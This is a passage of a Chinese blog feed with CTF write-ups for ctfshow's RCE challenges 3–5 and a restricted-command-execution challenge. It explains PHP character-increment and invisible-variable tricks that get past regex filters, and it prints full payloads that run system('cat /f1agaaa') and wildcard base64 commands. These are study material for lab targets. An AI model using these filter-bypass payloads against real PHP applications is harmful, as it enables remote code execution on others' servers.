class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//本题灵感来自研究Y4tacker佬在吃瓜杯投稿的shellme时想到的姿势，太棒啦~。</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$ctfshow</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_string</span>(<span class="variable">$ctfshow</span>) &amp;&amp; <span class="title function_ invoke__">strlen</span>(<span class="variable">$ctfshow</span>) &lt;= <span class="number">105</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-zA-Z2-9!&#x27;@#%^&amp;*:&#123;&#125;\-&lt;\?&gt;\&quot;|`~\\\\]/&quot;</span>,<span class="variable">$ctfshow</span>))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable">$ctfshow</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&quot;Are you hacking me AGAIN?&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="../images/image-20230220200800189.png" alt="image-20230220200800189"></p><p>这里是少了！’ 多了01</p><p>开始限制长度了，105字符，但是可以用数字0或者1，那么就可以通过(0/0)来构造float型的NAN，(1/0)来构造float型的INF，然后转换成字符串型，得到”NAN”和”INF”中的字符了，payload构造过程，这里直觉上认为构造<code>_GET</code>更简单，但是实际上目前可以用的字符当中，只有N离T最近，而从N开始自增构造T的时候，会经过OPQRS，所以其实构造<code>_GET</code> 的同时，已经把<code>_POST</code>构造出来了，相当于白构造了<code>GE</code></p><p>这里的话</p><p><img src="../images/image-20230220204020605.png" alt="image-20230220204020605"></p><p>字母的话可以随便取代，因为在这里的话字母会被当作0</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">NaN（Not a Number，非数）是计算机科学中数值数据类型的一类值，表示未定义或不可表示的值。常在浮点数运算中使用。首次引入NaN的是1985年的IEEE 754浮点数标准。</span><br><span class="line"></span><br><span class="line">INF：infinite，表示“无穷大”。 超出浮点数的表示范围（溢出，即阶码部分超过其能表示的最大值）。</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>原理还是上一题的自增，试着构造一下，当我是想直接$a[0]的时候，他没有回显，原来是因为现在的NAN还不算字符串,所以后面要在拼接一个例如</p><p><img src="../images/image-20230220204318669.png" alt="image-20230220204318669"></p><p>拼接一个字符的话就会变成字符串了。</p><p>但我我们需要字母才能构造N，就用上一题同样的方法构造出A来，因为0可以用了，所以我们就不用让报错直接用[0]就可以了</p><p><img src="../images/7bbcda92852545ce97dbd2d22b130783.png" alt="img"></p><p>这里能得到A是因为[].[]会变成Array,然后Array[0]就会生成A；</p><p><strong>和RCE挑战2构造方法一样</strong></p><p>然后我们就可以得到N了</p><p><img src="../images/fc6729792a6c44d68b05e5e91c2b82a7.png" alt="img"></p><p>这里能得到N是因为$_为A，然后A的话会变成0，然后再连接字符串A就可以了</p><p><code>$__=(A/A.A)[0]</code>就是会变成这样</p><p>之后再跟上一步一样一步一步自增就可以了</p><p><strong>payload</strong>1</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_</span>=([].[])[<span class="number">0</span>];    <span class="comment">//得到Array</span></span><br><span class="line"><span class="variable">$_</span>=(<span class="variable">$_</span>/<span class="variable">$_</span>.<span class="variable">$_</span>)[<span class="number">0</span>];   <span class="comment">//__=N</span></span><br><span class="line"><span class="variable">$_</span>++;  <span class="comment">//O</span></span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>.<span class="variable">$_</span>++;  <span class="comment">//拼接PO</span></span><br><span class="line"><span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;  <span class="comment">//S</span></span><br><span class="line"><span class="variable">$__</span>.=<span class="variable">$_</span>; <span class="comment">//拼接POS</span></span><br><span class="line"><span class="variable">$_</span>++;  <span class="comment">//T</span></span><br><span class="line"><span class="variable">$_</span>=_.<span class="variable">$__</span>.<span class="variable">$_</span>;  <span class="comment">//拼接_和POST</span></span><br><span class="line"><span class="variable">$$_</span>[<span class="number">0</span>](<span class="variable">$$_</span>[<span class="number">1</span>]);  <span class="comment">//$_POST[0]($_POST[1])</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$_=([].[])[0];$_=($_/$_.$_)[0];$_++;$__=$_.$_++;$_++;$_++;$_++;$__.=$_;$_++;$_=_.$__.$_;$$_[0]($$_[1]);</span><br></pre></td></tr></table></figure><p><strong>paylaod2</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">```</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=(<span class="number">0</span>/<span class="number">0</span>);<span class="comment">//NAN</span></span><br><span class="line"><span class="variable">$a</span>.=_;<span class="comment">//NAN_</span></span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$a</span>[<span class="number">0</span>];<span class="comment">//N</span></span><br><span class="line"><span class="variable">$a</span>++;<span class="comment">//O</span></span><br><span class="line"><span class="variable">$o</span>=<span class="variable">$a</span>++;<span class="comment">//$o=$a++是先把$a的值给$o,然后再对$a进行自增，所以这一句结束的时候 $a是P，$o是O</span></span><br><span class="line"><span class="variable">$p</span>=<span class="variable">$a</span>++;<span class="comment">//$a=&gt;Q,$p=&gt;P</span></span><br><span class="line"><span class="variable">$a</span>++;<span class="variable">$a</span>++;<span class="comment">//R</span></span><br><span class="line"><span class="variable">$s</span>=<span class="variable">$a</span>++;<span class="comment">//S</span></span><br><span class="line"><span class="variable">$t</span>=<span class="variable">$a</span>;<span class="comment">//T</span></span><br><span class="line"><span class="variable">$_</span>=_;<span class="comment">//_</span></span><br><span class="line"><span class="variable">$_</span>.=<span class="variable">$p</span>.<span class="variable">$o</span>.<span class="variable">$s</span>.<span class="variable">$t</span>;<span class="comment">//_POST</span></span><br><span class="line"><span class="variable">$$_</span>[<span class="number">0</span>](<span class="variable">$$_</span>[<span class="number">1</span>]);<span class="comment">//$_POST[0]($_POST[1]);</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctf_show=$%ff=(<span class="number">0</span>/<span class="number">0</span>);$%ff.=_;$%ff=$%ff[<span class="number">0</span>];$%ff%<span class="number">2</span>b%<span class="number">2</span>b;$%fd=$%ff%<span class="number">2</span>b%<span class="number">2</span>b;$%fe=$%ff%<span class="number">2</span>b%<span class="number">2</span>b;$%ff%<span class="number">2</span>b%<span class="number">2</span>b;$%ff%<span class="number">2</span>b%<span class="number">2</span>b;$%fc=$%ff%<span class="number">2</span>b%<span class="number">2</span>b;$%fb=$%ff;<span class="variable">$_</span>=_;<span class="variable">$_</span>.=$%fe.$%fd.$%fc.$%fb;<span class="variable">$$_</span>[<span class="number">0</span>](<span class="variable">$$_</span>[<span class="number">1</span>]);&amp;<span class="number">0</span>=system&amp;<span class="number">1</span>=cat /f1agaaa</span><br></pre></td></tr></table></figure><p><strong>%ff %fc  啥的是不可见字符</strong></p><p><img src="../images/6OR8G{3@$0C}Y(S_" alt="img">1JIJ[C.png)</p><p><strong>这里字母被过滤了，还可以利用不可见字符来给参数命名，学到了一个新知识点</strong></p><h2 id="RCE挑战4"><a href="#RCE挑战4" class="headerlink" title="RCE挑战4"></a>RCE挑战4</h2><p>题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//本题灵感来自研究Y4tacker佬在吃瓜杯投稿的shellme时想到的姿势，太棒啦~。</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$ctfshow</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_string</span>(<span class="variable">$ctfshow</span>) &amp;&amp; <span class="title function_ invoke__">strlen</span>(<span class="variable">$ctfshow</span>) &lt;= <span class="number">84</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-zA-Z1-9!&#x27;@#%^&amp;*:&#123;&#125;\-&lt;\?&gt;\&quot;|`~\\\\]/&quot;</span>,<span class="variable">$ctfshow</span>))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable">$ctfshow</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&quot;Are you hacking me AGAIN?&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="../images/image-20230220223437262.png" alt="image-20230220223437262"></p><p>这下子的话只有这些能进行利用了</p><p>少了个1，并且的话长度也进行了限制。</p><p>还是可以用<strong>rce3</strong>的方法，因为1没用到，并且只要在<strong>RCE3</strong>的基础上适当的缩短就行了</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$</span><span class="language-bash">a=(_/_._)[0];//直接拼接成字符串并切片</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">o=++<span class="variable">$a</span>;//<span class="variable">$o</span>=++<span class="variable">$a</span>是先把<span class="variable">$a</span>进行自增，自增完成之后再将值返回，也就是这一句结束的时候 <span class="variable">$a</span>和<span class="variable">$o</span>都是O</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">o=++<span class="variable">$a</span>.<span class="variable">$o</span>;//<span class="variable">$o</span>=&gt;PO,<span class="variable">$a</span>=&gt;P</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">a++;//Q</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">a++;//R</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">o.=++<span class="variable">$a</span>;//<span class="variable">$o</span>=&gt;POS,<span class="variable">$a</span>=&gt;S</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">o.=++<span class="variable">$a</span>;//<span class="variable">$o</span>=&gt;POST,<span class="variable">$a</span>=&gt;T</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">_=_.<span class="variable">$o</span>;//_POST</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash"><span class="variable">$_</span>[0]($<span class="variable">$_</span>[_]);//<span class="variable">$_POST</span>[0](<span class="variable">$_POST</span>[_]);</span></span><br></pre></td></tr></table></figure><p>这里的话还是利用不可见字符替代php变量名称(这里的payload得用bp发包，因为hackbar的话不会解析7f以后的字符)</p><p><strong>payload</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctf_show=$%ff=(_/_._)[<span class="number">0</span>];$%fe=%<span class="number">2</span>b%<span class="number">2</span>b$%ff;$%fe=%<span class="number">2</span>b%<span class="number">2</span>b$%ff.$%fe;$%ff%<span class="number">2</span>b%<span class="number">2</span>b;$%ff%<span class="number">2</span>b%<span class="number">2</span>b;$%fe.=%<span class="number">2</span>b%<span class="number">2</span>b$%ff;$%fe.=%<span class="number">2</span>b%<span class="number">2</span>b$%ff;<span class="variable">$_</span>=_.$%fe;<span class="variable">$$_</span>[<span class="number">0</span>](<span class="variable">$$_</span>[_]);&amp;<span class="number">0</span>=system&amp;_=cat /f1agaaa</span><br></pre></td></tr></table></figure><h2 id="RCE挑战5"><a href="#RCE挑战5" class="headerlink" title="RCE挑战5"></a>RCE挑战5</h2><p>题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//本题灵感来自研究Y4tacker佬在吃瓜杯投稿的shellme时想到的姿势，太棒啦~。</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$ctfshow</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_string</span>(<span class="variable">$ctfshow</span>) &amp;&amp; <span class="title function_ invoke__">strlen</span>(<span class="variable">$ctfshow</span>) &lt;= <span class="number">73</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-zA-Z0-9!&#x27;@#%^&amp;*:&#123;&#125;\-&lt;\?&gt;\&quot;|`~\\\\]/&quot;</span>,<span class="variable">$ctfshow</span>))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable">$ctfshow</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&quot;Are you hacking me AGAIN?&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="../images/image-20230220224606275.png" alt="image-20230220224606275"></p><p>这里的话是把01都给过滤掉了，长度也更短了</p><p>限制73个字符，而且0也不可以用了，但是这里观察到phpinfo安装了一个扩展gettext，该扩展支持函数<code>_()</code> ,相当于<code>gettext()</code>，直接转化为字符串。另外，其实数组下标使用未定义常量，php会warning，但是可以继续运行，并返回下标为0的字符（现象是这样但是实际机制需要看php源码）。其余知识点上面都已经讲过了，剩下的就是靠经验和积累对payload进行精简，下面是payload构造过程：</p><p><strong>EXP</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">_</span>(a/a)[a];<span class="comment">//相当于gettext(0/0)[0],得到N</span></span><br><span class="line"><span class="variable">$_</span>=++<span class="variable">$a</span>;<span class="comment">//O</span></span><br><span class="line"><span class="variable">$_</span>=_.++<span class="variable">$a</span>.<span class="variable">$_</span>;<span class="comment">//_PO</span></span><br><span class="line"><span class="variable">$a</span>++;<span class="variable">$a</span>++;<span class="comment">//R</span></span><br><span class="line"><span class="variable">$_</span>.=++<span class="variable">$a</span>.++<span class="variable">$a</span>;<span class="comment">//_POST</span></span><br><span class="line"><span class="variable">$$_</span>[a](<span class="variable">$$_</span>[_]);<span class="comment">//$_POST[a]($_POST[_])</span></span><br></pre></td></tr></table></figure><p>然后常规的替换成不可见字符变量名称，得到payload：</p><p><strong>payload</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctf_show=$%ff=<span class="title function_ invoke__">_</span>(%ff/%ff)[%ff];<span class="variable">$_</span>=%<span class="number">2</span>b%<span class="number">2</span>b$%ff;<span class="variable">$_</span>=_.%<span class="number">2</span>b%<span class="number">2</span>b$%ff.<span class="variable">$_</span>;$%ff%<span class="number">2</span>b%<span class="number">2</span>b;$%ff%<span class="number">2</span>b%<span class="number">2</span>b;<span class="variable">$_</span>.=%<span class="number">2</span>b%<span class="number">2</span>b$%ff.%<span class="number">2</span>b%<span class="number">2</span>b$%ff;<span class="variable">$$_</span>[_](<span class="variable">$$_</span>[%ff]);&amp;_=system&amp;%ff=cat /f1agaaa</span><br></pre></td></tr></table></figure><h3 id="更短的payload-72位"><a href="#更短的payload-72位" class="headerlink" title="更短的payload(72位)"></a>更短的payload(72位)</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">_</span>(a/a)[a];<span class="comment">//N</span></span><br><span class="line">++<span class="variable">$a</span>;<span class="comment">//O</span></span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$a</span>.<span class="variable">$a</span>++;<span class="comment">//PO</span></span><br><span class="line"><span class="variable">$a</span>++;<span class="variable">$a</span>++;<span class="comment">//R</span></span><br><span class="line"><span class="variable">$_</span>=_.<span class="variable">$_</span>.++<span class="variable">$a</span>.++<span class="variable">$a</span>;<span class="comment">//_POST</span></span><br><span class="line"><span class="variable">$$_</span>[a](<span class="variable">$$_</span>[_]);<span class="comment">//$_POST[a]($_POST[_])</span></span><br></pre></td></tr></table></figure><p><strong>payload1</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctf_show=$%ff=_(%ff/%ff)[%ff];%2b%2b$%ff;$_=$%ff.$%ff%2b%2b;$%ff%2b%2b;$%ff%2b%2b;$_=_.$_.%2b%2b$%ff.%2b%2b$%ff;$$_[%ff]($$_[_]);&amp;%ff=system&amp;_=cat /f1agaaa</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_</span>=<span class="variable">$a</span>.<span class="variable">$a</span>++;<span class="comment">//PO  相对于上一步，就是进行了这一步的修改</span></span><br></pre></td></tr></table></figure><p>至于为什么<code>$_=$a.$a++;</code>这一步得到的是PO而不是OP，或者OO，而<code>$_=_.$a.$a++;</code>得到的是<code>_OO</code>,经过和用这种做法的师傅们讨论，目前分析下来最有可能的原因是，PHP在做字符串拼接的过程中（.操作），是一个从左到右递归的过程，而<code>++</code>操作类似于一个函数，php在执行完函数后，再做拼接的操作，<code>$_=$a.$a++;//PO</code>这里相当于先执行了<code>$a++</code>操作（函数），并得到<code>$a++</code>的返回值，然后和左侧的<code>$a</code>变量进行拼接，此时<code>$a</code>已经是P了。而<code>$_=_.$a.$a++;</code>时先执行了<code>_</code>和<code>$a</code>的拼接，而后再执行<code>$_=&#39;_O&#39;.$a++</code>，所以得到的是<code>_OO</code>。*以上所有均为猜测，具体机制需研究PHP源码。</p><h3 id="68位字符"><a href="#68位字符" class="headerlink" title="68位字符"></a>68位字符</h3><p>目前在gettext环境下，最短的payload了</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$</span><span class="language-bash">_=_(a/a)[_];//N</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">a=++<span class="variable">$_</span>;//O</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash"><span class="variable">$a</span>[<span class="variable">$a</span>=_.++<span class="variable">$_</span>.<span class="variable">$a</span>[<span class="variable">$_</span>++/<span class="variable">$_</span>++].++<span class="variable">$_</span>.++<span class="variable">$_</span>]($<span class="variable">$a</span>[_]);//巧妙的把两次<span class="variable">$_</span>++放在一起</span></span><br></pre></td></tr></table></figure><p>这里的话php解析是从左到右递归的过程，这里有疑问的话一般都是<code>$a[$_++/$_++]</code>对这个有疑问，然后我就本地测试了一下，发现是这样的</p><p>就是<code>$a</code>的话是为O的，然后[P/Q]就会被解析成[0],然后$a[0]就是$a的值。</p><p><strong>可以本地跑一下看看结果。</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=O;<span class="comment">//O</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>[<span class="number">0</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;----------&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>[P/Q];</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230221183422744.png" alt="image-20230221183422744"></p><p><strong>payload</strong>(用不可见字符替代参数)</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctf_show=$_=_(%ff/%ff)[_];$%ff=%2b%2b$_;$$%ff[$%ff=_.%2b%2b$_.$%ff[$_%2b%2b/$_%2b%2b].%2b%2b$_.%2b%2b$_]($$%ff[_]);&amp;_POST=system&amp;_=cat /f1agaaa</span><br></pre></td></tr></table></figure><p><strong>这上面的题目几乎全是有关于自增rce的</strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;RCE挑战1&quot;&gt;&lt;a href=&quot;#RCE挑战1&quot; class=&quot;headerlink&quot; title=&quot;RCE挑战1&quot;&gt;&lt;/a&gt;RCE挑战1&lt;/h2&gt;&lt;p&gt;题目&lt;/p&gt;
&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td cl</summary>
      
    
    
    
    
    <category term="ctfshow RCE极限挑战" scheme="https://ke1nys.github.io/tags/ctfshow-RCE%E6%9E%81%E9%99%90%E6%8C%91%E6%88%98/"/>
    
  </entry>
  
  <entry>
    <title>ctfshow-极限命令执行</title>
    <link href="https://ke1nys.github.io/posts/85259dde.html"/>
    <id>https://ke1nys.github.io/posts/85259dde.html</id>
    <published>2023-02-20T02:42:40.000Z</published>
    <updated>2023-02-21T10:37:42.441Z</updated>
    
    <content type="html"><![CDATA[<p>关于getFlag()函数的命令执行  <a href="https://www.anquanke.com/post/id/154284">文章</a></p><p>官方wp <a href="https://ctf-show.feishu.cn/docx/EH72dMi3hoBtLJxDydjcIVcQnSc">文章</a></p><h2 id="极限命令执行1"><a href="#极限命令执行1" class="headerlink" title="极限命令执行1"></a>极限命令执行1</h2><p>题目代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//本题灵感来自研究一直没做出来的某赛某题时想到的姿势，太棒啦~。</span></span><br><span class="line"><span class="comment">//flag在根目录flag里，或者直接运行根目录getflag</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$ctfshow</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[b-zA-Z_@#%^&amp;*:&#123;&#125;\-\+&lt;&gt;\&quot;|`;\[\]]/&quot;</span>,<span class="variable">$ctfshow</span>))&#123;</span><br><span class="line">            <span class="title function_ invoke__">system</span>(<span class="variable">$ctfshow</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&quot;????????&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这里首先跑一下正则，因为一些不知名原因，直接显示不出来，所有进行url加密以后去解密了。</span><br></pre></td></tr></table></figure><p>这里跑正则的意思是因为可以直接看哪些符号可以进行利用。</p><p><strong>代码</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$a</span> = <span class="number">0</span>; <span class="variable">$a</span> &lt; <span class="number">256</span>; <span class="variable">$a</span>++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[b-zA-Z_@#%^&amp;*:&#123;&#125;\-\+&lt;&gt;\&quot;|`;\[\]]/&quot;</span>,<span class="title function_ invoke__">chr</span>(<span class="variable">$a</span>)))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">chr</span>(<span class="variable">$a</span>)).<span class="string">&quot; &quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>以后遇到这种题就可以先去跑一下正则，看哪些可以进行利用</p><p><img src="../images/image-20230220104940596.png" alt="image-20230220104940596"></p><p>输出的<code>urlencode</code>编码的结果，然后进行解码查看</p><p><img src="../images/image-20230220105114058.png" alt="image-20230220105114058"></p><p><strong>只有这些可以进行利用</strong></p><p>这里题目提示的环境是<code>centos7</code>,那么在这个环境下是可以利用/进行命令执行的。</p><p><img src="../images/image-20230220105456573.png" alt="image-20230220105456573"></p><p><strong>/getflag</strong>是一个php的继承类方法，可以直接使用，会返回1</p><p><strong>payload</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">全称是  /bin/base64 flag.php  这里提示的是根目录，所以是/bin/base64 /flag</span><br><span class="line">payload1：ctf_show=/?????a?</span><br><span class="line">payload2：ctf_show=/???/?a??<span class="number">64</span> /??a?</span><br></pre></td></tr></table></figure><p><strong>这里考的是无字母进行rce，那么可以ctfshow的命令执行模块找到</strong></p><h2 id="极限命令执行2"><a href="#极限命令执行2" class="headerlink" title="极限命令执行2"></a>极限命令执行2</h2><p>题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 